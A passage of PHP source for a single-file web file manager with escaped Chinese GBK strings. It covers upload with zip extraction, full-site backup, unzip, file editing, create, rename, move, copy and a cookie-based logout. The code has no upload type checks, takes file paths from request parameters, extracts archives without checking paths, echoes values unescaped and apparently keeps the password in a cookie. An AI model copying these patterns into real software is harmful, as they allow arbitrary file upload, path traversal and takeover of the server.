href=\\"".$meurl."?op=up\\">\xbc\xcc\xd0\xf8\xc9\xcf\xb4\xab</a>\\n";\r\n    }\r\n    mainbottom();\r\n    return true;\r\n    }else{\r\n    printerror (\'\xce\xc4\xbc\xfe\xb5\xd8\xd6\xb7\xb2\xbb\xc4\xdc\xce\xaa\xbf\xd5\xa1\xa3\');\r\n    }\r\n}\r\nfunction upload($upfile,$ndir,$unzip,$delzip) {\r\n    global $meurl, $folder;\r\n    $nfolder = $folder;\r\n    $nndir = $ndir;\r\n    $ndir = iconv("UTF-8", "GBK", $ndir);\r\n    if (!$upfile) {\r\n        printerror("\xc4\xfa\xc3\xbb\xd3\xd0\xd1\xa1\xd4\xf1\xce\xc4\xbc\xfe\xa3\xa1");\r\n    }elseif($upfile) { \r\n      maintop("\xc9\xcf\xb4\xab");\r\n  if (!file_exists($ndir)){\r\n    mkdir($ndir, 0755);\r\n    }\r\n    $i = 1;\r\n    while (count($upfile[\'name\']) >= $i){\r\n    $dir = iconv("UTF-8", "GBK", $nndir.$upfile[\'name\'][$i-1]);\r\n        if(@copy($upfile[\'tmp_name\'][$i-1],$dir)) {\r\n            echo "\xce\xc4\xbc\xfe ".$nndir.$upfile[\'name\'][$i-1]." \xc9\xcf\xb4\xab\xb3\xc9\xb9\xa6\\n<br>";\r\n            if(end(explode(\'.\', $upfile[\'name\'][$i-1]))=="zip" && isset($unzip) && $unzip == "checkbox"){\r\n            if(class_exists(\'ZipArchive\')){\r\n                    $zip = new ZipArchive();\r\n                    if ($zip->open($dir) === TRUE) {\r\n                        $zip->extractTo($ndir);\r\n                        $zip->close();\r\n                        echo $upfile[\'name\'][$i-1]." \xd2\xd1\xbe\xad\xb1\xbb\xbd\xe2\xd1\xb9\xb5\xbd$nndir<br>";\r\n                        if(isset($delzip) && $delzip == "checkbox"){\r\n                        if(unlink($folder.$upfile[\'name\'][$i-1])){\r\n                            echo $upfile[\'name\'][$i-1]." \xc9\xbe\xb3\xfd\xb3\xc9\xb9\xa6<br>";\r\n                            }else{\r\n                                echo $upfile[\'name\'][$i-1].("<span class=\\"error\\">\xc9\xbe\xb3\xfd\xca\xa7\xb0\xdc\xa3\xa1</span><br>");\r\n                            }\r\n                        }\r\n                    }else{\r\n                        echo("<span class=\\"error\\">\xce\xde\xb7\xa8\xbd\xe2\xd1\xb9\xce\xc4\xbc\xfe\xa3\xba".$nndir.$upfile[\'name\'][$i-1]."</span><br>");\r\n                    }\r\n                }else{\r\n                echo("<span class=\\"error\\">\xb4\xcb\xb7\xfe\xce\xf1\xc6\xf7\xc9\xcf\xb5\xc4PHP\xb2\xbb\xd6\xa7\xb3\xd6ZipArchive\xa3\xac\xce\xde\xb7\xa8\xbd\xe2\xd1\xb9\xce\xc4\xbc\xfe\xa3\xa1</span><br>");\r\n                }\r\n            }\r\n        }else{\r\n            echo("<span class=\\"error\\">\xce\xc4\xbc\xfe ".$upfile[\'name\'][$i-1]." \xc9\xcf\xb4\xab\xca\xa7\xb0\xdc</span><br>");\r\n        }\r\n        $i++;\r\n    }\r\n        echo "\xc4\xe3\xbf\xc9\xd2\xd4 <a href=\\"".$meurl."?op=home&folder=".$ndir."\\">\xb4\xf2\xbf\xaa\xce\xc4\xbc\xfe\xbc\xd0</a> \xbb\xf2\xd5\xdf <a href=\\"".$meurl."?op=home&folder=".$_SESSION[\'folder\']."\\">\xb7\xb5\xbb\xd8\xce\xc4\xbc\xfe\xb9\xdc\xc0\xed</a> \xbb\xf2\xd5\xdf <a href=\\"".$meurl."?op=up\\">\xbc\xcc\xd0\xf8\xc9\xcf\xb4\xab</a>\\n";\r\n        mainbottom();\r\n    }else{\r\n        printerror("\xc4\xfa\xc3\xbb\xd3\xd0\xd1\xa1\xd4\xf1\xce\xc4\xbc\xfe\xa3\xa1");\r\n    }\r\n}\r\nfunction allz() {\r\nglobal $meurl;\r\n    maintop("\xc8\xab\xd5\xbe\xb1\xb8\xb7\xdd");\r\n    echo "<table border=\\"0\\" cellpadding=\\"2\\" cellspacing=\\"0\\">\\n"\r\n        ."<span class=\'error\'>**\xbe\xaf\xb8\xe6: \xd5\xe2\xbd\xab\xbd\xf8\xd0\xd0\xc8\xab\xd5\xbe\xb4\xf2\xb0\xfc\xb3\xc9allbackup.zip\xb5\xc4\xb6\xaf\xd7\xf7! \xc8\xe7\xb4\xe6\xd4\xda\xb8\xc3\xce\xc4\xbc\xfe\xa3\xac\xb8\xc3\xce\xc4\xbc\xfe\xbd\xab\xb1\xbb\xb8\xb2\xb8\xc7!**</span><br><br>\\n"\r\n        ."\xc8\xb7\xb6\xa8\xd2\xaa\xbd\xf8\xd0\xd0\xc8\xab\xd5\xbe\xb4\xf2\xb0\xfc?<br><br>\\n"\r\n        ."\xc4\xe3\xbf\xc9\xd2\xd4 <a href=\\"".$meurl."?op=allzip\\">\xce\xd2\xd2\xd1\xbe\xad\xc1\xcb\xbd\xe2\xb8\xc3\xb2\xd9\xd7\xf7\xcb\xf9\xd4\xec\xb3\xc9\xb5\xc4\xba\xf3\xb9\xfb\xa3\xac\xc8\xb7\xc8\xcf\xca\xb9\xd3\xc3</a> \xbb\xf2\xd5\xdf \\n"\r\n        ."<a href=\\"".$meurl."?op=home&folder=".$_SESSION[\'folder\']."\\">\xb7\xb5\xbb\xd8\xce\xc4\xbc\xfe\xb9\xdc\xc0\xed</a>\\n"\r\n        ."</table>\\n";\r\n    mainbottom();\r\n}\r\nfunction allzip() {\r\nglobal $meurl;\r\n    if(class_exists(\'ZipArchive\')){\r\n    maintop("\xc8\xab\xd5\xbe\xb1\xb8\xb7\xdd");\r\n        if (file_exists(\'allbackup.zip\')) {\r\n            unlink(\'allbackup.zip\'); \r\n        }\r\n        class Zipper extends ZipArchive {\r\n            public function addDir() {\r\n                $dr = opendir(\'./\');\r\n                $i=0;\r\n                while (($file = readdir($dr)) !== false)\r\n                {\r\n                if($file!==\'.\' && $file!==\'..\'){\r\n                    $nodes[$i] = $file;\r\n                    $i++;\r\n                    }\r\n                }\r\n                closedir($dr);\r\n                foreach ($nodes as $node) {\r\n                $nnode = iconv("GBK", "UTF-8", $node);\r\n                    echo $nnode.\'<br>\';\r\n                    if (is_dir($node)) {\r\n                        $this->addDir2($node);\r\n                    }elseif(is_file($node)){\r\n                        $this->addFile($node);\r\n                    }\r\n                }\r\n            }\r\n            public function addDir2($path) {\r\n            $npath = iconv("GBK", "UTF-8", $path);\r\n                $this->addEmptyDir($path);\r\n                $dr = opendir($path.\'/\');\r\n                $i=0;\r\n                while (($file = readdir($dr)) !== false)\r\n                {\r\n                if($file!==\'.\' && $file!==\'..\'){\r\n                    $nodes[$i] = $path.\'/\'.$file;\r\n                    $i++;\r\n                    }\r\n                }\r\n                closedir($dr);\r\n                foreach ($nodes as $node) {\r\n                $nnode = iconv("GBK", "UTF-8", $node);\r\n                    echo $nnode.\'<br>\';\r\n                    if (is_dir($node)) {\r\n                        $this->addDir2($node);\r\n                    }elseif(is_file($node)){\r\n                        $this->addFile($node);\r\n                    }\r\n                }\r\n            }\r\n        }\r\n        $zip = new Zipper;\r\n        $res = $zip->open(\'allbackup.zip\', ZipArchive::CREATE);\r\n        if ($res === TRUE) {\r\n            $zip->addDir();\r\n            $zip->close();\r\n            echo \'\xc8\xab\xd5\xbe\xd1\xb9\xcb\xf5\xcd\xea\xb3\xc9\xa3\xa1\'\r\n                ." <a href=\\"".$meurl."?op=home&folder=".$_SESSION[\'folder\']."\\">\xb7\xb5\xbb\xd8\xce\xc4\xbc\xfe\xb9\xdc\xc0\xed</a>\\n";\r\n        }else{\r\n            echo \'<span class="error">\xc8\xab\xd5\xbe\xd1\xb9\xcb\xf5\xca\xa7\xb0\xdc\xa3\xa1</span>\'\r\n                ." <a href=\\"".$meurl."?op=home&folder=".$_SESSION[\'folder\']."\\">\xb7\xb5\xbb\xd8\xce\xc4\xbc\xfe\xb9\xdc\xc0\xed</a>\\n";\r\n        }\r\n        mainbottom();\r\n    }else{\r\n    printerror(\'\xb4\xcb\xb7\xfe\xce\xf1\xc6\xf7\xc9\xcf\xb5\xc4PHP\xb2\xbb\xd6\xa7\xb3\xd6ZipArchive\xa3\xac\xce\xde\xb7\xa8\xd1\xb9\xcb\xf5\xce\xc4\xbc\xfe\xa3\xa1\');\r\n    }\r\n}\r\nfunction unz($dename) {\r\n    global $meurl, $folder, $content, $filefolder;\r\n    if (!$dename == "") {\r\n        maintop("\xbd\xe2\xd1\xb9");\r\n        echo "<table border=\\"0\\" cellpadding=\\"2\\" cellspacing=\\"0\\">\\n"\r\n            ."<span class=error>**\xbe\xaf\xb8\xe6: \xd5\xe2\xbd\xab\xbd\xe2\xd1\xb9 ".$folder.$dename.". **</span ><br><br>\\n"\r\n            ."<form ENCTYPE=\\"multipart/form-data\\" action=\\"".$meurl."?op=unzip\\">\xbd\xe2\xd1\xb9\xb5\xbd..."\r\n            ."<input type=\\"text\\" name=\\"ndir\\" class=\\"text\\" value=\\"".$_SESSION[\'folder\']."\\">";\r\n        echo $content\r\n            ."</select>"\r\n            ."<br><br>\xc8\xb7\xb6\xa8\xd2\xaa\xbd\xe2\xd1\xb9 ".$folder.$dename."?<br><br>\\n"\r\n            ."<input type=\\"hidden\\" name=\\"op\\" value=\\"unzip\\">\\n"\r\n            ."<input type=\\"hidden\\" name=\\"dename\\" value=\\"".$dename."\\">\\n"\r\n            ."<input type=\\"hidden\\" name=\\"folder\\" value=\\"".$folder."\\">\\n"\r\n            ."<input type=\\"submit\\" value=\\"\xbd\xe2\xd1\xb9\\" class=\\"button\\"><input type=\\"checkbox\\" name=\\"del\\" id=\\"del\\"value=\\"del\\"><label for=\\"del\\">\xcd\xac\xca\xb1\xc9\xbe\xb3\xfd\xd1\xb9\xcb\xf5\xce\xc4\xbc\xfe</label><br><br>\\n"\r\n            ." <a href=\\"".$meurl."?op=home&folder=".$_SESSION[\'folder\']."\\">\xb7\xb5\xbb\xd8\xce\xc4\xbc\xfe\xb9\xdc\xc0\xed</a>\\n"\r\n            ."</table>\\n";\r\n        mainbottom();\r\n    }else{\r\n        home();\r\n    }\r\n}\r\nfunction unzip($dename,$ndir,$del) {\r\n    global $meurl, $folder;\r\n    $nndir = $ndir;\r\n    $nfolder = $folder;\r\n    $ndename = $dename;\r\n    $dename = iconv("UTF-8", "GBK", $dename);\r\n    $folder = iconv("UTF-8", "GBK", $folder);\r\n    $ndir = iconv("UTF-8", "GBK", $ndir);\r\n    if (!$dename == "") {\r\n        if (!file_exists($ndir)){\r\n        mkdir($ndir, 0755);\r\n        }\r\n        if(class_exists(\'ZipArchive\')){\r\n            $zip = new ZipArchive();\r\n            if ($zip->open($folder.$dename) === TRUE) {\r\n                $zip->extractTo($ndir);\r\n                $zip->close();\r\n                maintop("\xbd\xe2\xd1\xb9");\r\n                echo $dename." \xd2\xd1\xbe\xad\xb1\xbb\xbd\xe2\xd1\xb9\xb5\xbd $nndir<br>";\r\n                if($del==\'del\'){\r\n                unlink($folder.$dename);\r\n                echo $ndename." \xd2\xd1\xbe\xad\xb1\xbb\xc9\xbe\xb3\xfd<br>";\r\n                }\r\n                echo "<a href=\\"".$meurl."?op=home&folder=".$_SESSION[\'folder\']."\\">\xb7\xb5\xbb\xd8\xce\xc4\xbc\xfe\xb9\xdc\xc0\xed</a>\\n";\r\n                mainbottom();\r\n            }else{\r\n                printerror(\'\xce\xde\xb7\xa8\xbd\xe2\xd1\xb9\xce\xc4\xbc\xfe\xa3\xba\'.$nfolder.$ndename);\r\n            }\r\n        }else{\r\n        printerror(\'\xb4\xcb\xb7\xfe\xce\xf1\xc6\xf7\xc9\xcf\xb5\xc4PHP\xb2\xbb\xd6\xa7\xb3\xd6ZipArchive\xa3\xac\xce\xde\xb7\xa8\xbd\xe2\xd1\xb9\xce\xc4\xbc\xfe\xa3\xa1\');\r\n        }\r\n    }else{\r\n        home();\r\n    }\r\n}\r\nfunction deltree($pathdir)  \r\n{  \r\nif(is_empty_dir($pathdir))//\xc8\xe7\xb9\xfb\xca\xc7\xbf\xd5\xb5\xc4  \r\n    {  \r\n    rmdir($pathdir);//\xd6\xb1\xbd\xd3\xc9\xbe\xb3\xfd  \r\n    }  \r\n    else  \r\n    {//\xb7\xf1\xd4\xf2\xb6\xc1\xd5\xe2\xb8\xf6\xc4\xbf\xc2\xbc\xa3\xac\xb3\xfd\xc1\xcb.\xba\xcd..\xcd\xe2  \r\n        $d=dir($pathdir);  \r\n        while($a=$d->read())  \r\n        {  \r\n        if(is_file($pathdir.\'/\'.$a) && ($a!=\'.\') && ($a!=\'..\')){unlink($pathdir.\'/\'.$a);}  \r\n        //\xc8\xe7\xb9\xfb\xca\xc7\xce\xc4\xbc\xfe\xbe\xcd\xd6\xb1\xbd\xd3\xc9\xbe\xb3\xfd  \r\n        if(is_dir($pathdir.\'/\'.$a) && ($a!=\'.\') && ($a!=\'..\'))  \r\n        {//\xc8\xe7\xb9\xfb\xca\xc7\xc4\xbf\xc2\xbc  \r\n            if(!is_empty_dir($pathdir.\'/\'.$a))//\xca\xc7\xb7\xf1\xce\xaa\xbf\xd5  \r\n            {//\xc8\xe7\xb9\xfb\xb2\xbb\xca\xc7\xa3\xac\xb5\xf7\xd3\xc3\xd7\xd4\xc9\xed\xa3\xac\xb2\xbb\xb9\xfd\xca\xc7\xd4\xad\xc0\xb4\xb5\xc4\xc2\xb7\xbe\xb6+\xcb\xfb\xcf\xc2\xbc\xb6\xb5\xc4\xc4\xbf\xc2\xbc\xc3\xfb  \r\n            deltree($pathdir.\'/\'.$a);  \r\n            }  \r\n            if(is_empty_dir($pathdir.\'/\'.$a))  \r\n            {//\xc8\xe7\xb9\xfb\xca\xc7\xbf\xd5\xbe\xcd\xd6\xb1\xbd\xd3\xc9\xbe\xb3\xfd  \r\n            rmdir($pathdir.\'/\'.$a);\r\n            }\r\n        }  \r\n        }  \r\n        $d->close();  \r\n    }  \r\n}  \r\nfunction is_empty_dir($pathdir)  \r\n{ \r\n//\xc5\xd0\xb6\xcf\xc4\xbf\xc2\xbc\xca\xc7\xb7\xf1\xce\xaa\xbf\xd5 \r\n    $d=opendir($pathdir);  \r\n    $i=0;  \r\n    while($a=readdir($d)){  \r\n        $i++;  \r\n    }  \r\n    closedir($d);  \r\n    if($i>2){return false;}  \r\n    else return true;  \r\n    }\r\nfunction edit($fename) {\r\n    global $meurl,$folder;\r\n    $file = iconv("UTF-8", "GBK", $folder.$fename);\r\n    if (file_exists($folder.$fename)) {\r\n        maintop("\xb1\xe0\xbc\xad");\r\n        echo $folder.$fename;\r\n        $contents = file_get_contents($file);\r\n        $encode = mb_detect_encoding($contents);\r\n        if($encode!=="UTF-8"){\r\n            $contents = iconv("UTF-8", $encode, $contents);\r\n        }\r\n        echo "<form action=\\"".$meurl."?op=save&encode=".$encode."\\" method=\\"post\\">\\n"\r\n            ."<textarea cols=\\"73\\" rows=\\"40\\" name=\\"ncontent\\">\\n";\r\n        echo htmlspecialchars($contents);\r\n        echo "</textarea>\\n"\r\n            ."<br>\\n"\r\n            ."<input type=\\"hidden\\" name=\\"folder\\" value=\\"".$folder."\\">\\n"\r\n            ."<input type=\\"hidden\\" name=\\"fename\\" value=\\"".$fename."\\">\\n"\r\n            ."<input type=\\"submit\\" value=\\"\xb1\xa3\xb4\xe6\\" class=\\"button\\"> <a href=\\"".$meurl."?op=home&folder=".$_SESSION[\'folder\']."\\">\xb7\xb5\xbb\xd8\xce\xc4\xbc\xfe\xb9\xdc\xc0\xed</a>\\n"\r\n            ."</form>\\n";\r\n        mainbottom();\r\n    }else{\r\n        home();\r\n    }\r\n}\r\nfunction save($ncontent, $fename, $encode) {\r\n    global $meurl,$folder;\r\n    if (!$fename == "") {\r\n    maintop("\xb1\xe0\xbc\xad");\r\n    $file = iconv("UTF-8", "GBK", $folder.$fename);\r\n    $ydata = stripslashes($ncontent);\r\n    if($encode!=="UTF-8"){\r\n    $ydata = iconv($encode, "UTF-8", $ydata);\r\n    }\r\n    if(file_put_contents($file, $ydata)) {\r\n        echo "\xce\xc4\xbc\xfe <a href=\\"".$folder.$fename."\\" target=\\"_blank\\">".$folder.$fename."</a> \xb1\xa3\xb4\xe6\xb3\xc9\xb9\xa6\xa3\xa1\\n"\r\n            ." <a href=\\"".$meurl."?op=home&folder=".$_SESSION[\'folder\']."\\">\xb7\xb5\xbb\xd8\xce\xc4\xbc\xfe\xb9\xdc\xc0\xed</a> \xbb\xf2\xd5\xdf <a href=\\"".$meurl."?op=edit&fename=".$fename."&folder=".$folder."\\">\xbc\xcc\xd0\xf8\xb1\xe0\xbc\xad</a>\\n";\r\n        $fp = null;\r\n    }else{\r\n        echo "<span class=\'error\'>\xce\xc4\xbc\xfe\xb1\xa3\xb4\xe6\xb3\xf6\xb4\xed\xa3\xa1</span>\\n"\r\n        ." <a href=\\"".$meurl."?op=home&folder=".$_SESSION[\'folder\']."\\">\xb7\xb5\xbb\xd8\xce\xc4\xbc\xfe\xb9\xdc\xc0\xed</a>\\n";\r\n    }\r\n    mainbottom();\r\n    }else{\r\n    home();\r\n    }\r\n}\r\nfunction cr() {\r\n    global $meurl, $folder, $content, $filefolder;\r\n    maintop("\xb4\xb4\xbd\xa8");\r\n    if (!$content == "") { echo "<br><br>\xc7\xeb\xca\xe4\xc8\xeb\xd2\xbb\xb8\xf6\xc3\xfb\xb3\xc6.\\n"; }\r\n    echo "<form action=\\"".$meurl."?op=create\\" method=\\"post\\">\\n"\r\n        ."\xce\xc4\xbc\xfe\xc3\xfb\xa3\xba<br><input type=\\"text\\" size=\\"20\\" name=\\"nfname\\" class=\\"text\\"><br><br>\\n"\r\n        ."\xc4\xbf\xb1\xea\xc4\xbf\xc2\xbc\xa3\xba<br><input type=\\"text\\" class=\\"text\\" name=\\"ndir\\" value=\\"".$_SESSION[\'folder\']."\\">";\r\n    echo $content\r\n        ."</select><br><br>";\r\n    echo "\xce\xc4\xbc\xfe <input type=\\"radio\\" size=\\"20\\" name=\\"isfolder\\" value=\\"0\\" checked><br>\\n"\r\n        ."\xc4\xbf\xc2\xbc <input type=\\"radio\\" size=\\"20\\" name=\\"isfolder\\" value=\\"1\\"><br><br>\\n"\r\n        ."<input type=\\"hidden\\" name=\\"folder\\" value=\\"$folder\\">\\n"\r\n        ."<input type=\\"submit\\" value=\\"\xb4\xb4\xbd\xa8\\" class=\\"button\\">  <a href=\\"".$meurl."?op=home&folder=".$_SESSION[\'folder\']."\\">\xb7\xb5\xbb\xd8\xce\xc4\xbc\xfe\xb9\xdc\xc0\xed</a>\\n"\r\n        ."</form>\\n";\r\n    mainbottom();\r\n}\r\nfunction create($nfname, $isfolder, $ndir) {\r\n    global $meurl, $folder;\r\n    if (!$nfname == "") {\r\n        maintop("\xb4\xb4\xbd\xa8");\r\n        $ndir = iconv("UTF-8", "GBK", $ndir);\r\n        $nfname = iconv("UTF-8", "GBK", $nfname);\r\n    if ($isfolder == 1) {\r\n        if(@mkdir($ndir."/".$nfname, 0755)) {\r\n        $ndir = iconv("GBK", "UTF-8", $ndir);\r\n        $nfname = iconv("GBK", "UTF-8", $nfname);\r\n            echo "\xc4\xfa\xb5\xc4\xc4\xbf\xc2\xbc<a href=\\"".$meurl."?op=home&folder=./".$nfname."/\\">".$ndir.$nfname."/</a> \xd2\xd1\xbe\xad\xb3\xc9\xb9\xa6\xb1\xbb\xb4\xb4\xbd\xa8.\\n"\r\n            ."<br><a href=\\"".$meurl."?op=home&folder=".$ndir.$nfname."/\\">\xb4\xf2\xbf\xaa\xce\xc4\xbc\xfe\xbc\xd0</a> | <a href=\\"".$meurl."?op=home&folder=".$_SESSION[\'folder\']."\\">\xb7\xb5\xbb\xd8\xce\xc4\xbc\xfe\xb9\xdc\xc0\xed</a>\\n";\r\n        }else{\r\n        $ndir = iconv("GBK", "UTF-8", $ndir);\r\n        $nfname = iconv("GBK", "UTF-8", $nfname);\r\n            echo "<span class=\'error\'>\xc4\xfa\xb5\xc4\xc4\xbf\xc2\xbc".$ndir."".$nfname." \xb2\xbb\xc4\xdc\xb1\xbb\xb4\xb4\xbd\xa8\xa1\xa3\xc7\xeb\xbc\xec\xb2\xe9\xc4\xfa\xb5\xc4\xc4\xbf\xc2\xbc\xc8\xa8\xcf\xde\xca\xc7\xb7\xf1\xd2\xd1\xbe\xad\xb1\xbb\xc9\xe8\xd6\xc3\xce\xaa\xbf\xc9\xd0\xb4 \xbb\xf2\xd5\xdf \xc4\xbf\xc2\xbc\xca\xc7\xb7\xf1\xd2\xd1\xbe\xad\xb4\xe6\xd4\xda</span>\\n";\r\n        }\r\n    }else{\r\n        if(@fopen($ndir."/".$nfname, "w")) {\r\n        $ndir = iconv("GBK", "UTF-8", $ndir);\r\n        $nfname = iconv("GBK", "UTF-8", $nfname);\r\n            echo "\xc4\xfa\xb5\xc4\xce\xc4\xbc\xfe, <a href=\\"".$meurl."?op=viewframe&file=".$nfname."&folder=$ndir\\">".$ndir.$nfname."</a> \xd2\xd1\xbe\xad\xb3\xc9\xb9\xa6\xb1\xbb\xb4\xb4\xbd\xa8\\n"\r\n                ."<br><a href=\\"".$meurl."?op=edit&fename=".$nfname."&folder=".$ndir."\\">\xb1\xe0\xbc\xad\xce\xc4\xbc\xfe</a> | <a href=\\"".$meurl."?op=home&folder=".$_SESSION[\'folder\']."\\">\xb7\xb5\xbb\xd8\xce\xc4\xbc\xfe\xb9\xdc\xc0\xed</a>\\n";\r\n        }else{\r\n        $ndir = iconv("GBK", "UTF-8", $ndir);\r\n        $nfname = iconv("GBK", "UTF-8", $nfname);\r\n            echo "<span class=\'error\'>\xc4\xfa\xb5\xc4\xce\xc4\xbc\xfe ".$ndir.$nfname." \xb2\xbb\xc4\xdc\xb1\xbb\xb4\xb4\xbd\xa8\xa1\xa3\xc7\xeb\xbc\xec\xb2\xe9\xc4\xfa\xb5\xc4\xc4\xbf\xc2\xbc\xc8\xa8\xcf\xde\xca\xc7\xb7\xf1\xd2\xd1\xbe\xad\xb1\xbb\xc9\xe8\xd6\xc3\xce\xaa\xbf\xc9\xd0\xb4 \xbb\xf2\xd5\xdf \xce\xc4\xbc\xfe\xca\xc7\xb7\xf1\xd2\xd1\xbe\xad\xb4\xe6\xd4\xda</span>\\n";\r\n        }\r\n    }\r\n    mainbottom();\r\n    }else{\r\n    cr();\r\n    }\r\n}\r\nfunction ren($file) {\r\n    global $meurl,$folder,$ufolder;\r\n    $ufile = $file;\r\n    if (!$file == "") {\r\n        maintop("\xd6\xd8\xc3\xfc\xc3\xfb");\r\n        echo "<form action=\\"".$meurl."?op=rename\\" method=\\"post\\">\\n"\r\n            ."<table border=\\"0\\" cellpadding=\\"2\\" cellspacing=\\"0\\">\\n"\r\n            ."\xd6\xd8\xc3\xfc\xc3\xfb ".$ufolder.$ufile;\r\n        echo "</table><br>\\n"\r\n            ."<input type=\\"hidden\\" name=\\"rename\\" value=\\"".$ufile."\\">\\n"\r\n            ."<input type=\\"hidden\\" name=\\"folder\\" value=\\"".$ufolder."\\">\\n"\r\n            ."\xd0\xc2\xce\xc4\xbc\xfe\xc3\xfb:<br><input class=\\"text\\" type=\\"text\\" size=\\"20\\" name=\\"nrename\\" value=\\"$ufile\\">\\n"\r\n            ."<input type=\\"Submit\\" value=\\"\xd6\xd8\xc3\xfc\xc3\xfb\\" class=\\"button\\"></form>\\n";\r\n        mainbottom();\r\n    }else{\r\n        home();\r\n    }\r\n}\r\nfunction renam($rename, $nrename, $folder) {\r\n    global $meurl,$folder;\r\n    if (!$rename == "") {\r\n        $loc1 = iconv("UTF-8", "GBK", "$folder".$rename); \r\n        $loc2 = iconv("UTF-8", "GBK", "$folder".$nrename);\r\n        if(rename($loc1,$loc2)) {\r\n        maintop("\xd6\xd8\xc3\xfc\xc3\xfb");\r\n            echo "\xce\xc4\xbc\xfe ".$folder.$rename." \xd2\xd1\xb1\xbb\xd6\xd8\xc3\xfc\xc3\xfb\xb3\xc9 ".$folder.$nrename."</a>\\n"\r\n            ." <a href=\\"".$meurl."?op=home&folder=".$_SESSION[\'folder\']."\\">\xb7\xb5\xbb\xd8\xce\xc4\xbc\xfe\xb9\xdc\xc0\xed</a>\\n";\r\n            mainbottom();\r\n        }else{\r\n            printerror("\xd6\xd8\xc3\xfc\xc3\xfb\xb3\xf6\xb4\xed\xa3\xa1");\r\n        }\r\n    }else{\r\n    home();\r\n    }\r\n}\r\nfunction movall($file, $ndir, $folder) {\r\n    global $meurl,$folder;\r\n    if (!$file == "") {\r\n        maintop("\xc5\xfa\xc1\xbf\xd2\xc6\xb6\xaf");\r\n        $arr = str_split($ndir);\r\n        if($arr[count($arr)-1]!==\'/\'){\r\n            $ndir .= \'/\';\r\n        }\r\n        $nndir = $ndir;\r\n        $nfolder = $folder;\r\n    $file = iconv("UTF-8", "GBK",$file);\r\n    $ndir = iconv("UTF-8", "GBK",$ndir);\r\n    $folder = iconv("UTF-8", "GBK",$folder);\r\n        if (!file_exists($ndir)){\r\n        mkdir($ndir, 0755);\r\n        }\r\n        $file = explode(\',\',$file);\r\n        foreach ($file as $v) {\r\n        if (file_exists($ndir.$v)){\r\n        @unlink($ndir.$v);\r\n        if (@rename($folder.$v, $ndir.$v)){\r\n        $v = iconv("GBK", "UTF-8",$v);\r\n            echo $nndir.$v." \xce\xc4\xbc\xfe\xb1\xbb ".$nfolder.$v." \xcc\xe6\xbb\xbb<br>";\r\n            }else{\r\n            $v = iconv("GBK", "UTF-8",$v);\r\n                echo "<span class=\'error\'>\xce\xde\xb7\xa8\xd2\xc6\xb6\xaf ".$nfolder.$v.\'\xa3\xac\xc7\xeb\xbc\xec\xb2\xe9\xce\xc4\xbc\xfe\xc8\xa8\xcf\xde</span><br>\';\r\n            }\r\n        }elseif (@rename($folder.$v, $ndir.$v)){\r\n        $v = iconv("GBK", "UTF-8",$v);\r\n            echo $nfolder.$v." \xd2\xd1\xbe\xad\xb3\xc9\xb9\xa6\xd2\xc6\xb6\xaf\xb5\xbd ".$nndir.$v.\'<br>\';\r\n        }else{\r\n        $v = iconv("GBK", "UTF-8",$v);\r\n            echo "<span class=\'error\'>\xce\xde\xb7\xa8\xd2\xc6\xb6\xaf ".$nfolder.$v.\'\xa3\xac\xc7\xeb\xbc\xec\xb2\xe9\xce\xc4\xbc\xfe\xc8\xa8\xcf\xde</span><br>\';\r\n        }\r\n        }\r\n    echo "\xc4\xe3\xbf\xc9\xd2\xd4 <a href=\\"".$meurl."?op=home&folder=".$nndir."\\">\xc7\xb0\xcd\xf9\xce\xc4\xbc\xfe\xbc\xd0\xb2\xe9\xbf\xb4\xce\xc4\xbc\xfe</a> \xbb\xf2\xd5\xdf <a href=\\"".$meurl."?op=home&folder=".$_SESSION[\'folder\']."\\">\xb7\xb5\xbb\xd8\xce\xc4\xbc\xfe\xb9\xdc\xc0\xed</a>\\n";\r\n    mainbottom();\r\n    }else{\r\n    home();\r\n    }\r\n}\r\nfunction tocopy($file, $ndir, $folder) {\r\n    global $meurl,$folder;\r\n    if (!$file == "") {\r\n        maintop("\xb8\xb4\xd6\xc6");\r\n        $nndir = $ndir;\r\n        $nfolder = $folder;\r\n    $file = iconv("UTF-8", "GBK",$file);\r\n    $ndir = iconv("UTF-8", "GBK",$ndir);\r\n    $folder = iconv("UTF-8", "GBK",$folder);\r\n        if (!file_exists($ndir)){\r\n        mkdir($ndir, 0755);\r\n        }\r\n        $file = explode(\',\',$file);\r\n        foreach ($file as $v) {\r\n        if (file_exists($ndir.$v)){\r\n        @unlink($ndir.$v);\r\n        if (@copy($folder.$v, $ndir.$v)){\r\n        $v = iconv("GBK", "UTF-8",$v);\r\n            echo $nndir.$v." \xce\xc4\xbc\xfe\xb1\xbb ".$nfolder.$v." \xcc\xe6\xbb\xbb<br>";\r\n            }else{\r\n            $v = iconv("GBK", "UTF-8",$v);\r\n                echo "<span class=\'error\'>\xce\xde\xb7\xa8\xb8\xb4\xd6\xc6 ".$nfolder.$v.\'\xa3\xac\xc7\xeb\xbc\xec\xb2\xe9\xce\xc4\xbc\xfe\xc8\xa8\xcf\xde</span><br>\';\r\n            }\r\n        }elseif (@copy($folder.$v, $ndir.$v)){\r\n        $v = iconv("GBK", "UTF-8",$v);\r\n            echo $nfolder.$v." \xd2\xd1\xbe\xad\xb3\xc9\xb9\xa6\xb8\xb4\xd6\xc6\xb5\xbd ".$nndir.$v.\'<br>\';\r\n        }else{\r\n        $v = iconv("GBK", "UTF-8",$v);\r\n            echo "<span class=\'error\'>\xce\xde\xb7\xa8\xb8\xb4\xd6\xc6 ".$nfolder.$v.\'\xa3\xac\xc7\xeb\xbc\xec\xb2\xe9\xce\xc4\xbc\xfe\xc8\xa8\xcf\xde</span><br>\';\r\n        }\r\n        }\r\n    echo "\xc4\xe3\xbf\xc9\xd2\xd4 <a href=\\"".$meurl."?op=home&folder=".$nndir."\\">\xc7\xb0\xcd\xf9\xce\xc4\xbc\xfe\xbc\xd0\xb2\xe9\xbf\xb4\xce\xc4\xbc\xfe</a> \xbb\xf2\xd5\xdf <a href=\\"".$meurl."?op=home&folder=".$_SESSION[\'folder\']."\\">\xb7\xb5\xbb\xd8\xce\xc4\xbc\xfe\xb9\xdc\xc0\xed</a>\\n";\r\n    mainbottom();\r\n    }else{\r\n    home();\r\n    }\r\n}\r\n/****************************************************************/\r\n/* function logout()                                            */\r\n/*                                                              */\r\n/* Logs the user out and kills cookies                          */\r\n/****************************************************************/\r\nfunction logout() {\r\n    global $meurl,$login;\r\n    setcookie("user","",time()-60*60*24*1);\r\n    setcookie("pass","",time()-60*60*24*1);\r\n    maintop("\xcd\xcb\xb3\xf6",false);\r\n    echo "\xc4\xe3\xd2\xd1\xbe\xad\xcd\xcb\xb3\xf6."\r\n        ."<br><br>"\r\n        ."<a 